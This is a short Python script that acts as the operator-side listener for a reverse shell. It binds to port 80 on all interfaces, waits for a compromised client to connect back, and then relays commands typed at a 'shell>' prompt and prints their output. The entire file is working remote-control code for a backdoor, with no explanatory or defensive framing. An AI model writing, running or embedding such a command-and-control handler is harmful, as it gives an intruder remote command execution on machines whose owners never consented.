# Modules
import socket,sys

#Variables
HOST = "0.0.0.0"
PORT = 80
BUFFER = 1024

# Server
def server():
  global client_socket
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((HOST, PORT))
  s.listen(1)
  print(f"Listening as {HOST}:{PORT}")
  print("\n")
  client_socket, address = s.accept()
  print(f"{address[0]}:{address[1]} connected")
  print("\n")

def listening():
  command = input("shell> ")
  client_socket.send(command.encode())
  result = client_socket.recv(BUFFER).decode()
  print(result)

# Sending commands to the client
server()
while True:
  try:
    listening()
  except ConnectionError:
    sys.exit()
  except KeyboardInterrupt:
    print("Exiting...")
    sys.exit()